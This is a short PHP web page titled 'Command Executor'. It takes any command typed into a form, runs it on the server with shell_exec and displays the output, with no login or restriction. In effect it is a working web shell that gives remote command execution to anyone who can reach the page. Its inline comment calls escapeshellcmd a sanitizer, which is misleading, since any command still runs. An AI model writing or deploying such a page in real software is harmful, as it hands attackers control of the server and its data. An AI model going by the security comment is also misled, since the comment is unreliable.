<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Command Executor</title>
</head>
<body>
    <form method="post">
        <input type="text" name="command" required placeholder="Enter command">
        <input type="submit" value="Run">
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $command = escapeshellcmd($_POST['command']); // Sanitize input
        $output = shell_exec($command); // Execute command

        if ($output === null) {
            echo "<pre>Error executing command.</pre>";
        } else {
            echo "<pre>" . htmlspecialchars($output) . "</pre>"; // Display output
        }
    }
    ?>
</body>
</html>
